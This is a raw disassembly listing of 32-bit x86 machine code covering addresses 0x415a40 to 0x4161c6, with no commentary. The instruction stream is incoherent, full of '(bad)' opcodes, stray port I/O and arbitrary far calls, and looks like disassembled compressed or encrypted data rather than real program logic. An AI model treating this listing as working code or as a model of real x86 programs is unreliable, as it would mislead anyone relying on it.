  415a40:	fnsave [edx-0x39]
  415a43:	mov    cs,WORD PTR [edi-0x2c]
  415a46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a47:	(bad)  
  415a49:	daa    
  415a4a:	stos   DWORD PTR es:[edi],eax
  415a4b:	pop    ss
  415a4c:	sbb    BYTE PTR [eax-0x471fced2],0xf4
  415a53:	push   0xffffff8e
  415a55:	test   eax,0x7f096677
  415a5a:	sbb    edi,edx
  415a5c:	fisub  DWORD PTR [edx+eiz*4+0x26]
  415a60:	pop    edi
  415a61:	pop    eax
  415a62:	dec    edx
  415a63:	arpl   WORD PTR [edx-0x7f4e525],bx
  415a69:	shr    BYTE PTR [eax-0x5132c49d],1
  415a6f:	inc    edi
  415a70:	scas   al,BYTE PTR es:[edi]
  415a71:	js     0x415a6c
  415a73:	add    eax,0x9cca9d64
  415a78:	fs mov ch,0x1c
  415a7b:	push   ebp
  415a7c:	stc    
  415a7d:	in     eax,dx
  415a7e:	inc    esi
  415a7f:	jno    0x415abc
  415a81:	les    edx,FWORD PTR [ebp+eiz*2-0x7d]
  415a85:	xchg   esp,eax
  415a86:	test   eax,0x3801bb40
  415a8b:	(bad)  
  415a8c:	test   al,0x61
  415a8e:	loope  0x415a6c
  415a90:	mov    bl,0x13
  415a92:	arpl   WORD PTR [ebp+0x14605067],bx
  415a98:	dec    edx
  415a99:	adc    DWORD PTR [eax],ebx
  415a9b:	in     eax,0x87
  415a9d:	pop    ebp
  415a9e:	or     bl,BYTE PTR [esi]
  415aa0:	call   0x1dbddf7f
  415aa5:	in     eax,dx
  415aa6:	jle    0x415aa3
  415aa8:	jne    0x415b0c
  415aaa:	ja     0x415af5
  415aac:	lock stos DWORD PTR es:[edi],eax
  415aae:	mov    cl,BYTE PTR [eax]
  415ab0:	rcr    BYTE PTR [ecx-0x43],0x30
  415ab4:	lock sahf 
  415ab6:	push   esi
  415ab7:	mov    WORD PTR [edi+0x3336b704],ds
  415abd:	fist   WORD PTR [esi]
  415abf:	add    eax,0x31f065e7
  415ac4:	xor    DWORD PTR [esp+eax*4+0x6f],edi
  415ac8:	fnstcw WORD PTR [ecx-0x7d8ddd53]
  415ace:	inc    ebp
  415acf:	mov    esp,0x81e8675f
  415ad4:	and    cl,bh
  415ad6:	push   eax
  415ad7:	add    eax,0x786afc82
  415adc:	jl     0x415aa4
  415ade:	sub    ch,bh
  415ae0:	jbe    0x415b02
  415ae2:	sub    eax,0x22ac324d
  415ae7:	dec    ebp
  415ae8:	cdq    
  415ae9:	mov    eax,ds:0x6376de4e
  415aee:	dec    edi
  415aef:	pop    ebp
  415af0:	loope  0x415a9c
  415af2:	or     cl,BYTE PTR [ebx-0x7233f29d]
  415af8:	(bad)  
  415af9:	out    0x49,al
  415afb:	push   0xffffffb4
  415afd:	xchg   edx,eax
  415afe:	sahf   
  415aff:	mov    cl,BYTE PTR [eax+0x2d58eb95]
  415b05:	jmp    0x415ae8
  415b07:	fist   DWORD PTR [edx+0x11]
  415b0a:	xchg   esi,eax
  415b0b:	cmp    eax,0x7fd56c18
  415b10:	psubusw mm4,QWORD PTR [edx+0x68db55b1]
  415b17:	shl    BYTE PTR [ebx],0xb9
  415b1a:	cmp    al,0x84
  415b1c:	cs sti 
  415b1e:	add    ebp,DWORD PTR [ebx-0x659ac860]
  415b24:	dec    ebp
  415b25:	jge    0x415acc
  415b27:	sbb    BYTE PTR [eax],0x46
  415b2a:	test   eax,0xfa7fe7bf
  415b2f:	mov    eax,ds:0xdb4c77c4
  415b34:	inc    eax
  415b35:	cmp    DWORD PTR [ebx],ecx
  415b37:	ficom  DWORD PTR [eax-0x7a50075b]
  415b3d:	add    BYTE PTR [eax],al
  415b3f:	add    BYTE PTR [eax],al
  415b41:	add    al,al
  415b43:	push   ss
  415b44:	sbb    BYTE PTR [ebx-0x2a],0xdf
  415b48:	fistp  DWORD PTR [edi-0x239a6a81]
  415b4e:	cwde   
  415b4f:	cdq    
  415b50:	pop    edi
  415b51:	dec    ecx
  415b52:	ins    BYTE PTR es:[edi],dx
  415b53:	fld    DWORD PTR [eax]
  415b55:	add    bl,dh
  415b57:	add    al,0x0
  415b59:	add    cl,ah
  415b5b:	loop   0x415bd8
  415b5d:	jmp    DWORD PTR [ebp+0x6a7b214d]
  415b63:	popa   
  415b64:	nop
  415b65:	ds popa 
  415b67:	fld    st(5)
  415b69:	or     al,0x17
  415b6b:	dec    eax
  415b6c:	add    BYTE PTR [ebx-0x50],ah
  415b6f:	and    DWORD PTR [esi+0x4f6f2495],ecx
  415b75:	arpl   cx,dx
  415b77:	mov    dh,0x71
  415b79:	sub    ah,BYTE PTR [edi-0x36]
  415b7c:	clc    
  415b7d:	clc    
  415b7e:	xchg   edi,eax
  415b7f:	mov    cl,0x28
  415b81:	cld    
  415b82:	retf   0xbad0
  415b85:	icebp  
  415b86:	cmp    dh,dl
  415b88:	push   edx
  415b89:	cwde   
  415b8a:	dec    ebx
  415b8b:	sub    DWORD PTR [esi-0x250b4dbd],0xffffffb8
  415b92:	std    
  415b93:	push   ss
  415b94:	dec    edi
  415b95:	mov    dl,0xb7
  415b97:	cmp    eax,0x57c49d84
  415b9c:	bound  ebp,QWORD PTR [edi]
  415b9e:	mov    WORD PTR [ecx+0xb],ds
  415ba1:	cmp    al,0xab
  415ba3:	(bad)  
  415ba4:	jae    0x415bad
  415ba6:	mov    edi,esp
  415ba8:	rol    BYTE PTR [ecx],1
  415baa:	lock (bad) 
  415bac:	sar    BYTE PTR [eax+0x74c7f017],1
  415bb2:	fisubr WORD PTR [edx]
  415bb4:	pop    ebp
  415bb5:	dec    eax
  415bb6:	inc    ebp
  415bb7:	mov    ah,0x18
  415bb9:	unpckhps xmm4,XMMWORD PTR [ebp+esi*2+0x297c5285]
  415bc1:	cmp    DWORD PTR [ebp-0x69036d0],esp
  415bc7:	test   eax,0xd6ac652e
  415bcc:	ins    DWORD PTR es:[edi],dx
  415bcd:	fs (bad) 
  415bcf:	iret   
  415bd0:	fwait
  415bd1:	pop    ebp
  415bd2:	sbb    esi,DWORD PTR [edx-0x7db0cfa8]
  415bd8:	cs das 
  415bda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415bdb:	xor    esp,DWORD PTR [esi+0x750b9eb1]
  415be1:	scas   eax,DWORD PTR es:[edi]
  415be2:	pop    ebx
  415be3:	push   ecx
  415be4:	call   0x8a51:0x2a2f24e7
  415beb:	retf   
  415bec:	jb     0x415b74
  415bee:	(bad)  
  415bf0:	xor    ecx,DWORD PTR [eax+ebp*8+0x7]
  415bf4:	pop    eax
  415bf5:	add    edi,DWORD PTR [esi]
  415bf7:	jbe    0x415c78
  415bf9:	(bad)  
  415bfa:	sub    eax,0x395c73dc
  415bff:	dec    edi
  415c00:	jo     0x415bb1
  415c02:	repnz jmp 0xabde:0xb1bc3384
  415c0a:	frstor [ebx+ebx*1-0x11ec79b8]
  415c11:	bound  eax,QWORD PTR [esi]
  415c13:	adc    al,0x6e
  415c15:	push   edx
  415c16:	push   0x2c608fef
  415c1b:	(bad)  
  415c1c:	adc    eax,0x2841a169
  415c21:	dec    esp
  415c22:	fcmove st,st(2)
  415c24:	or     ecx,DWORD PTR [edx-0x5c870459]
  415c2a:	imul   ebp,DWORD PTR [edi+0x6bffaf73],0x4d812ce2
  415c34:	outs   dx,BYTE PTR ds:[esi]
  415c35:	pop    es
  415c36:	inc    esp
  415c37:	in     al,0xe7
  415c39:	sahf   
  415c3a:	push   es
  415c3b:	adc    ebp,edi
  415c3d:	shl    BYTE PTR [ebx],cl
  415c3f:	ret    
  415c40:	test   bh,bl
  415c42:	jge    0x415c0d
  415c44:	pusha  
  415c45:	cmp    al,0x98
  415c47:	push   esp
  415c48:	and    DWORD PTR [ebx+ecx*2+0x1],ebx
  415c4c:	jb     0x415c2d
  415c4e:	push   edi
  415c4f:	or     al,0xe2
  415c51:	cli    
  415c52:	cld    
  415c53:	push   edi
  415c54:	adc    eax,0xb339c446
  415c59:	xchg   ecx,eax
  415c5a:	cli    
  415c5b:	adc    ebp,esp
  415c5d:	and    ch,BYTE PTR [edi+0x5d]
  415c60:	jp     0x415c7e
  415c62:	cld    
  415c63:	ror    DWORD PTR [esi+0x3],cl
  415c66:	jno    0x415bfc
  415c68:	pop    ds
  415c69:	dec    edi
  415c6a:	xchg   edx,eax
  415c6b:	jmp    0x53d1:0xa5d0cfe9
  415c72:	pop    ss
  415c73:	sub    ah,BYTE PTR [edi+0x1c]
  415c76:	mov    eax,0xd4585441
  415c7b:	inc    esp
  415c7c:	fdiv   st,st(4)
  415c7e:	aaa    
  415c7f:	pop    eax
  415c80:	enter  0xd71c,0xd
  415c84:	retf   
  415c85:	xchg   edi,eax
  415c86:	ja     0x415cb6
  415c88:	and    DWORD PTR [esi],ebx
  415c8a:	mov    ebx,0x4c1e778b
  415c8f:	add    eax,0x970c9ede
  415c94:	mov    dl,0x68
  415c96:	and    edx,esp
  415c98:	mov    ds:0xa82f2cba,eax
  415c9d:	cmp    eax,0xd3cdbb24
  415ca2:	mov    bl,0x11
  415ca4:	inc    ebp
  415ca5:	inc    esi
  415ca6:	mov    ebp,0x1173c2dd
  415cab:	scas   al,BYTE PTR es:[edi]
  415cac:	cdq    
  415cad:	cs das 
  415caf:	dec    edx
  415cb0:	lds    ebp,FWORD PTR [eax]
  415cb2:	out    0x38,al
  415cb4:	or     DWORD PTR [edx+ecx*8+0x4a],0xfffffff3
  415cb9:	rcr    BYTE PTR [edx-0x854d8ad],0xba
  415cc0:	xchg   esp,eax
  415cc1:	sub    BYTE PTR [ebx-0x11],ch
  415cc4:	je     0x415d02
  415cc6:	retf   0x5bc4
  415cc9:	loopne 0x415d43
  415ccb:	loop   0x415ca0
  415ccd:	dec    edi
  415cce:	mov    cl,0x73
  415cd0:	das    
  415cd1:	mov    esi,0xa37fff48
  415cd7:	xchg   ecx,eax
  415cd8:	pop    ecx
  415cd9:	pop    esi
  415cda:	pop    esp
  415cdb:	ins    BYTE PTR es:[edi],dx
  415cdc:	xchg   ebx,eax
  415cdd:	scas   al,BYTE PTR es:[edi]
  415cde:	dec    ebp
  415cdf:	mov    BYTE PTR [edx+0x75],dl
  415ce2:	sub    al,0xef
  415ce4:	es xchg esi,eax
  415ce6:	jb     0x415cf1
  415ce8:	cmp    eax,0x3c85b9a8
  415ced:	mov    edx,ebp
  415cef:	cwde   
  415cf0:	mov    ds:0xb94cbafa,al
  415cf5:	repz or bh,BYTE PTR [ebp+0x60462663]
  415cfc:	cwde   
  415cfd:	xchg   al,dh
  415cff:	mov    esp,0xd22637a
  415d04:	pop    ebx
  415d05:	sub    DWORD PTR [edi+0x53],ebx
  415d08:	jb     0x415d51
  415d0a:	inc    edi
  415d0b:	stos   DWORD PTR es:[edi],eax
  415d0c:	inc    ebx
  415d0d:	imul   edi,DWORD PTR [eax],0x196d1cf4
  415d13:	push   ecx
  415d14:	gs call 0x420fc17b
  415d1a:	push   edi
  415d1b:	adc    esi,DWORD PTR [ebx+0x2ded542a]
  415d21:	repz or esp,DWORD PTR [ebx+0x7a]
  415d25:	mov    esp,0xd96c6c00
  415d2a:	nop
  415d2b:	(bad)  
  415d2d:	adc    eax,0x3e2e32cf
  415d32:	jp     0x415cbe
  415d34:	dec    ecx
  415d35:	pop    ss
  415d36:	push   ds
  415d37:	popa   
  415d38:	push   ds
  415d39:	scas   eax,DWORD PTR es:[edi]
  415d3a:	jp     0x415ccc
  415d3c:	add    cl,cl
  415d3e:	shl    esi,0x15
  415d41:	aam    0xcd
  415d43:	pop    esi
  415d44:	and    eax,0x8c32c928
  415d49:	dec    edi
  415d4a:	in     al,0x79
  415d4c:	and    ecx,DWORD PTR [ecx+0x2e99dc0b]
  415d52:	(bad)  
  415d53:	es xor esi,0xf5f293a0
  415d5a:	shr    BYTE PTR [ecx+0x51c6c744],1
  415d60:	arpl   WORD PTR [ebp+ebx*8-0x3a],dx
  415d64:	mov    bh,0x6f
  415d66:	add    esp,DWORD PTR [ebx-0x37cd4744]
  415d6c:	outs   dx,DWORD PTR ds:[esi]
  415d6d:	rol    DWORD PTR [bp+si-0x766e],0xac
  415d73:	(bad)  
  415d74:	fld    DWORD PTR [ebx-0x6bfa0306]
  415d7a:	push   ebp
  415d7b:	(bad)  
  415d7c:	cdq    
  415d7d:	test   BYTE PTR [ecx-0x1e160aeb],ch
  415d83:	sub    al,BYTE PTR ss:[edi+0x42947922]
  415d8a:	dec    ebx
  415d8b:	mov    ch,ah
  415d8d:	stos   BYTE PTR es:[edi],al
  415d8e:	sbb    BYTE PTR [edi+0x50],ch
  415d91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d92:	mov    DWORD PTR [esp+eiz*2],esi
  415d95:	push   eax
  415d96:	lock test eax,0xc7537b0f
  415d9c:	js     0x415d42
  415d9e:	xchg   esp,eax
  415d9f:	lea    edx,[ebp+0x65]
  415da2:	mov    dl,0x27
  415da4:	in     eax,dx
  415da5:	ins    BYTE PTR es:[edi],dx
  415da6:	dec    ebx
  415da7:	mov    edi,DWORD PTR [eax-0x53]
  415daa:	push   ebp
  415dab:	call   0x5ef7:0xc21a846b
  415db2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415db3:	(bad)  
  415db4:	push   ebp
  415db5:	adc    DWORD PTR [edi-0x1afc7c6e],0x57
  415dbc:	pop    edx
  415dbd:	jg     0x415d6e
  415dbf:	repnz test BYTE PTR [edi+0x78e2eaa],ah
  415dc6:	dec    eax
  415dc7:	jo     0x415dbc
  415dc9:	xor    DWORD PTR [ecx+0x70f8a51a],0x52
  415dd0:	jbe    0x415e1e
  415dd2:	aad    0xba
  415dd4:	push   edi
  415dd5:	(bad)  
  415dd6:	in     eax,dx
  415dd7:	jns    0x415e40
  415dd9:	(bad)  
  415dda:	and    BYTE PTR [eax+0x7d9b3aac],ah
  415de0:	stc    
  415de1:	out    dx,eax
  415de2:	int    0xf9
  415de4:	popf   
  415de5:	and    BYTE PTR ds:0x781cece7,0x2b
  415dec:	dec    edi
  415ded:	push   0xaee3bf15
  415df2:	outs   dx,BYTE PTR ds:[esi]
  415df3:	push   ebp
  415df4:	add    ebp,ecx
  415df6:	push   es
  415df7:	mov    dh,0x73
  415df9:	ret    0x9355
  415dfc:	inc    esi
  415dfd:	cmp    bh,BYTE PTR [esi+0x28]
  415e00:	mov    dh,0xa7
  415e02:	pop    ecx
  415e03:	out    dx,al
  415e04:	pop    eax
  415e05:	xor    ecx,DWORD PTR ss:[edx]
  415e08:	or     DWORD PTR [ebx+0x76dab292],0x86d50edf
  415e12:	inc    ecx
  415e13:	dec    edx
  415e14:	leave  
  415e15:	jg     0x415e85
  415e17:	push   esi
  415e18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e19:	pop    ebp
  415e1a:	sbb    BYTE PTR [esi],cl
  415e1c:	fmul   QWORD PTR [ebx]
  415e1e:	mov    eax,ds:0x7ebb7418
  415e23:	sub    BYTE PTR [eax],cl
  415e25:	shl    BYTE PTR [eax],1
  415e27:	mov    cl,0xae
  415e29:	ret    0xa444
  415e2c:	dec    ebx
  415e2d:	xor    ebp,DWORD PTR [edi]
  415e2f:	aad    0x90
  415e31:	sbb    al,BYTE PTR gs:[eax+ebp*8]
  415e35:	icebp  
  415e36:	mov    esi,0xde948adb
  415e3b:	sub    BYTE PTR [edi+0x78],ah
  415e3e:	daa    
  415e3f:	addr16 jmp 0x415e51
  415e42:	adc    al,0x64
  415e44:	sbb    bl,BYTE PTR [edx]
  415e46:	mov    ch,0x30
  415e48:	adc    BYTE PTR [ebx],bl
  415e4a:	loope  0x415eb2
  415e4c:	lahf   
  415e4d:	cmp    DWORD PTR [edi+0x21],ebx
  415e50:	stc    
  415e51:	pop    ebx
  415e52:	mov    ds:0x6fb162fa,al
  415e57:	inc    si
  415e59:	(bad)  
  415e5a:	gs test al,0x7d
  415e5d:	push   cs
  415e5e:	test   al,0x40
  415e60:	lds    edx,FWORD PTR [esp+ebp*8-0x2c]
  415e64:	mul    BYTE PTR [ebx]
  415e66:	jo     0x415e30
  415e68:	shl    BYTE PTR [edx+0x28],1
  415e6b:	les    ecx,FWORD PTR [edx+esi*4]
  415e6e:	ins    BYTE PTR es:[edi],dx
  415e6f:	(bad)  
  415e70:	out    0x91,eax
  415e72:	pop    ebx
  415e73:	daa    
  415e74:	xor    dh,0x2b
  415e77:	push   cs
  415e78:	data16 xlat BYTE PTR ds:[ebx]
  415e7a:	mov    ah,0xb4
  415e7c:	call   0x4159:0xceb18068
  415e83:	shr    BYTE PTR [ecx+edi*2-0x24],cl
  415e87:	push   ds
  415e88:	push   0x6d
  415e8a:	xchg   ebp,eax
  415e8b:	enter  0xc095,0x47
  415e8f:	jne    0x415e32
  415e91:	cmp    al,0x56
  415e93:	test   DWORD PTR [edi-0x56],ebp
  415e96:	scas   al,BYTE PTR es:[edi]
  415e97:	mov    ds:0xf0c3cfbe,al
  415e9c:	jmp    DWORD PTR [eax]
  415e9e:	push   edx
  415e9f:	out    dx,eax
  415ea0:	fwait
  415ea1:	xchg   ebp,eax
  415ea2:	cmc    
  415ea3:	adc    dh,BYTE PTR [ecx-0x18]
  415ea6:	retf   
  415ea7:	jp     0x415e8c
  415ea9:	stos   BYTE PTR es:[edi],al
  415eaa:	jns    0x415eb2
  415eac:	xchg   esp,eax
  415ead:	arpl   WORD PTR [edx+esi*8],di
  415eb0:	outs   dx,DWORD PTR ds:[esi]
  415eb1:	mov    BYTE PTR [edi],bh
  415eb3:	fidiv  DWORD PTR [edx]
  415eb5:	mov    edi,0x1a5aa343
  415eba:	and    DWORD PTR [edx-0x1ef11d43],eax
  415ec0:	test   BYTE PTR [ebp+0x69d1b990],ch
  415ec6:	nop
  415ec7:	cmp    DWORD PTR [edx-0x7070dabc],0x3a
  415ece:	xor    esi,DWORD PTR [ebp+0x43]
  415ed1:	mov    DWORD PTR [ebx+0x3e],ebp
  415ed4:	xor    eax,0xed453e02
  415ed9:	xchg   ecx,eax
  415eda:	dec    esp
  415edb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415edc:	or     DWORD PTR [ebx-0x18],eax
  415edf:	inc    esp
  415ee0:	repz and eax,0x62441773
  415ee6:	imul   edi,DWORD PTR [ebx-0x25],0x61
  415eea:	push   esi
  415eeb:	test   eax,0xe9355814
  415ef0:	aas    
  415ef1:	shl    DWORD PTR [ebp+0x5d91ee3a],cl
  415ef7:	fimul  DWORD PTR [esi+0x7fe31ed6]
  415efd:	fwait
  415efe:	xchg   ebp,eax
  415eff:	push   ebx
  415f00:	pop    ebx
  415f01:	hlt    
  415f02:	loop   0x415edf
  415f04:	pop    ecx
  415f05:	int    0x15
  415f07:	je     0x415ed7
  415f09:	out    dx,al
  415f0a:	fadd   DWORD PTR [esi-0xb]
  415f0d:	and    eax,0x5f067b70
  415f12:	mov    ecx,0x4cf9a2ec
  415f17:	jp     0x415e9a
  415f19:	ds dec ecx
  415f1b:	and    cl,BYTE PTR [edx+0x1b]
  415f1e:	jp     0x415f5d
  415f20:	leave  
  415f21:	sbb    BYTE PTR ds:0xc6a8f249,bl
  415f27:	add    al,0x5c
  415f29:	call   0x9a1e:0x6121445a
  415f30:	xlat   BYTE PTR ds:[ebx]
  415f31:	pusha  
  415f32:	add    eax,0x53cdceb0
  415f37:	xchg   ebp,eax
  415f38:	out    0x49,eax
  415f3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f3b:	pushf  
  415f3c:	cdq    
  415f3d:	js     0x415ee6
  415f3f:	jmp    0xcb03:0x89911e27
  415f46:	clc    
  415f47:	and    DWORD PTR [esi-0x596e0788],0xb44a7111
  415f51:	stos   DWORD PTR es:[edi],eax
  415f52:	cwde   
  415f53:	sub    bl,BYTE PTR [ebx-0x47]
  415f56:	imul   ecx
  415f58:	add    al,0x67
  415f5a:	mov    BYTE PTR [ecx],ch
  415f5c:	fdiv   st(4),st
  415f5e:	sub    al,0x24
  415f60:	sbb    BYTE PTR [esi-0x3f24de59],dl
  415f66:	iret   
  415f67:	cmp    al,0x25
  415f69:	jge    0x2faf5867
  415f6f:	pop    edx
  415f70:	jge    0x415fa0
  415f72:	add    DWORD PTR [ebx],ebx
  415f74:	test   ah,bh
  415f76:	fwait
  415f77:	(bad)  
  415f78:	iret   
  415f79:	cmp    ebx,eax
  415f7b:	cmp    al,0x76
  415f7d:	test   BYTE PTR [esi],dl
  415f7f:	jecxz  0x415fe8
  415f81:	mov    dh,0xca
  415f83:	aaa    
  415f84:	mov    esi,fs
  415f86:	pop    edi
  415f87:	mov    eax,0x78517470
  415f8c:	cmp    DWORD PTR [eax],ebp
  415f8e:	add    DWORD PTR [ebp+0x1f],0x44
  415f92:	jb     0x415f6a
  415f94:	outs   dx,BYTE PTR ds:[esi]
  415f95:	cmp    al,0x9a
  415f97:	mov    BYTE PTR [ebp-0x475f971d],al
  415f9d:	push   ebx
  415f9e:	mov    edi,esi
  415fa0:	xor    DWORD PTR [ebp+0x32],ebx
  415fa3:	stos   BYTE PTR es:[edi],al
  415fa4:	mov    ah,0xf4
  415fa6:	imul   ebp,DWORD PTR [ebp-0x65],0x4c
  415faa:	mov    BYTE PTR [ecx-0x29],bh
  415fad:	and    eax,0x1f88612c
  415fb2:	add    cl,BYTE PTR [edx-0x64]
  415fb5:	(bad)  
  415fb6:	cmp    al,0x2e
  415fb8:	inc    ecx
  415fb9:	or     al,BYTE PTR [ebx+0x2f]
  415fbc:	push   esp
  415fbd:	sbb    bh,BYTE PTR [eax+0x701dc39e]
  415fc3:	or     eax,ebp
  415fc5:	inc    edx
  415fc6:	ins    DWORD PTR es:[edi],dx
  415fc7:	dec    esi
  415fc8:	xor    bh,BYTE PTR [edx+0x444e7a47]
  415fce:	inc    eax
  415fcf:	(bad)  
  415fd0:	std    
  415fd1:	xor    DWORD PTR [ecx+0x78],eax
  415fd4:	fild   WORD PTR [eax+0x73341955]
  415fda:	and    eax,0x74c36428
  415fdf:	rcl    BYTE PTR [eax-0x40],cl
  415fe2:	inc    edx
  415fe3:	push   edi
  415fe4:	xchg   ebx,eax
  415fe5:	mov    ds:0x475f8a80,al
  415fea:	cld    
  415feb:	test   eax,0x588328a0
  415ff0:	outs   dx,BYTE PTR ds:[esi]
  415ff1:	xchg   esp,eax
  415ff2:	in     eax,dx
  415ff3:	fs mov esp,ebx
  415ff6:	xor    ebx,DWORD PTR [esi+0x47f9e888]
  415ffc:	div    DWORD PTR [edx]
  415ffe:	shl    ch,1
  416000:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416001:	or     eax,eax
  416003:	pop    ss
  416004:	sub    eax,0xec467f36
  416009:	xchg   esi,eax
  41600a:	jae    0x416017
  41600c:	popa   
  41600d:	(bad)  
  41600e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41600f:	and    al,0x24
  416011:	repnz outs dx,BYTE PTR ds:[esi]
  416013:	loope  0x415fd2
  416015:	ret    
  416016:	in     eax,0xad
  416018:	loope  0x415fe6
  41601a:	jp     0x415feb
  41601c:	sub    edx,esp
  41601e:	pop    esp
  41601f:	cld    
  416020:	jae    0x416035
  416022:	cmp    ah,bl
  416024:	cmp    DWORD PTR [ebp-0x23],eax
  416027:	fnstsw WORD PTR [ebp+0x7a7f0a74]
  41602d:	adc    bh,dh
  41602f:	out    0x68,al
  416031:	lahf   
  416032:	cmp    esp,DWORD PTR [ecx+0x32dd90fa]
  416038:	push   0x17d8008f
  41603d:	xor    eax,0xd2ed4fa
  416042:	fld    DWORD PTR [ecx]
  416044:	cmp    esp,DWORD PTR [ebx+0x704355a7]
  41604a:	ins    BYTE PTR es:[edi],dx
  41604b:	(bad)  
  41604c:	cmp    al,BYTE PTR [eax]
  41604e:	add    BYTE PTR [eax],al
  416050:	add    BYTE PTR [eax],al
  416052:	cmp    dh,BYTE PTR [ebp+0x3c]
  416055:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416056:	jg     0x416047
  416058:	mov    edx,0xd72f5cfd
  41605d:	jae    0x41609f
  41605f:	inc    esi
  416060:	stos   BYTE PTR es:[edi],al
  416061:	add    BYTE PTR [edi-0x22],bl
  416064:	add    BYTE PTR [eax],al
  416066:	repz add al,0x0
  416069:	add    bh,bh
  41606b:	loope  0x4160b1
  41606d:	retf   0x95ca
  416070:	test   al,0xca
  416072:	call   0xa20a:0xef102d53
  416079:	je     0x415fff
  41607b:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  41607d:	and    eax,0x97f6e347
  416082:	pop    edx
  416083:	pop    edi
  416084:	mov    cl,0xea
  416086:	or     eax,0x125a85f9
  41608b:	pop    esi
  41608c:	repnz sub al,0x1f
  41608f:	cli    
  416090:	mov    ah,0xb0
  416092:	hlt    
  416093:	mov    cl,0x21
  416095:	inc    ebx
  416096:	js     0x4160f4
  416098:	cmp    BYTE PTR [ecx+eiz*8+0x22],dl
  41609c:	repnz test edx,ebp
  41609f:	lahf   
  4160a0:	rol    cl,cl
  4160a2:	clc    
  4160a3:	sub    DWORD PTR [eax],eax
  4160a5:	push   ds
  4160a6:	sti    
  4160a7:	and    al,0x1b
  4160a9:	sub    BYTE PTR [esi-0x66],ah
  4160ac:	les    edi,FWORD PTR [ecx+0x627f4eb1]
  4160b2:	pop    ebp
  4160b3:	ja     0x41604b
  4160b5:	jne    0x4160fb
  4160b7:	cmp    edi,DWORD PTR [esi-0x15]
  4160ba:	add    edx,DWORD PTR [ecx]
  4160bc:	icebp  
  4160bd:	loop   0x4160ae
  4160bf:	dec    ecx
  4160c0:	mov    BYTE PTR ds:0x88f59505,ch
  4160c6:	iret   
  4160c7:	stos   DWORD PTR es:[edi],eax
  4160c8:	inc    eax
  4160c9:	mov    bl,0x21
  4160cb:	cmp    bh,BYTE PTR [ebx]
  4160cd:	push   0xffffffb3
  4160cf:	cdq    
  4160d0:	cmp    BYTE PTR ds:0xdf188c1,al
  4160d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4160d7:	fucomip st,st(3)
  4160d9:	mov    cl,0x38
  4160db:	push   esi
  4160dc:	or     eax,ebp
  4160de:	pop    edx
  4160df:	pop    ebx
  4160e0:	pusha  
  4160e1:	pop    edi
  4160e2:	pop    ss
  4160e3:	jbe    0x4160f7
  4160e5:	adc    al,0xf8
  4160e7:	call   0x519a:0xeb01b7c7
  4160ee:	mov    bl,dl
  4160f0:	mov    ebx,0x584aaa80
  4160f5:	aam    0x99
  4160f7:	jmp    0x416157
  4160f9:	or     eax,0xc7225ecb
  4160fe:	pop    edi
  4160ff:	pop    ebx
  416100:	sahf   
  416101:	sar    BYTE PTR [ebp+edi*2+0x2],1
  416105:	jo     0x4160fe
  416107:	dec    ebp
  416108:	mov    WORD PTR [ebx+esi*2+0x65],?
  41610c:	out    0x15,eax
  41610e:	and    BYTE PTR [edi-0x7f741b8c],dh
  416114:	or     DWORD PTR [esi-0x6f6ec7d1],eax
  41611a:	je     0x416168
  41611c:	pushf  
  41611d:	test   al,0x33
  41611f:	mov    ?,WORD PTR [ebp+0x6a]
  416122:	aas    
  416123:	retf   0x21a8
  416126:	inc    edi
  416127:	stos   BYTE PTR es:[edi],al
  416128:	sbb    al,BYTE PTR [edi-0xd0ed4a]
  41612e:	mov    edi,0xcabc1d57
  416133:	(bad)  
  416134:	sbb    bl,BYTE PTR [edx+0x2b]
  416137:	out    dx,al
  416138:	scas   eax,DWORD PTR es:[edi]
  416139:	inc    edi
  41613a:	shl    BYTE PTR [ecx],0xa1
  41613d:	dec    ebx
  41613e:	mov    ebx,0x18998268
  416143:	mov    dh,0xfd
  416145:	adc    BYTE PTR [eax],al
  416147:	cmp    BYTE PTR [ebp-0x4f30fed7],ah
  41614d:	pop    edi
  41614e:	out    dx,al
  41614f:	adc    al,0x11
  416151:	or     DWORD PTR [eax],ebp
  416153:	cli    
  416154:	arpl   WORD PTR [ecx+edx*1-0x68e527d9],bx
  41615b:	xchg   edi,eax
  41615c:	push   eax
  41615d:	outs   dx,DWORD PTR ds:[esi]
  41615e:	pusha  
  41615f:	xlat   BYTE PTR ds:[ebx]
  416160:	ins    BYTE PTR es:[edi],dx
  416161:	pop    ebx
  416162:	and    bl,0xce
  416165:	jbe    0x41616b
  416167:	sbb    ah,BYTE PTR [esi]
  416169:	je     0x41615d
  41616b:	push   es
  41616c:	fld    QWORD PTR [edi]
  41616e:	mov    ah,0x9c
  416170:	call   0xc81:0x3acd7a9b
  416177:	mov    dl,0x37
  416179:	xor    al,BYTE PTR [edi-0x8eafff0]
  41617f:	jl     0x4161da
  416181:	mov    ds:0xf9f04475,al
  416186:	cmp    ecx,ebp
  416188:	sub    esp,DWORD PTR [esi+ebp*8+0x76ab3991]
  41618f:	shl    BYTE PTR [ebp-0x75c670f5],0x57
  416196:	aad    0x7f
  416198:	mov    edi,ds
  41619a:	sahf   
  41619b:	pop    ebp
  41619c:	and    eax,0x6e1ff49e
  4161a1:	fcom   QWORD PTR [eax]
  4161a3:	ins    DWORD PTR es:[edi],dx
  4161a4:	and    eax,0xde45655b
  4161a9:	jae    0x4161dc
  4161ab:	pop    ds
  4161ac:	jo     0x4161ee
  4161ae:	lods   al,BYTE PTR ds:[esi]
  4161af:	mov    esp,0x33317ef
  4161b4:	jo     0x416184
  4161b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4161b7:	lea    esi,[eax]
  4161b9:	xor    esp,DWORD PTR [esi]
  4161bb:	cmp    ebp,0x41
  4161be:	lods   eax,DWORD PTR ds:[esi]
  4161bf:	inc    edx
  4161c0:	aaa    
  4161c1:	js     0x416234
  4161c3:	arpl   bx,dx
  4161c5:	push   esp
  4161c6:	(bad)  
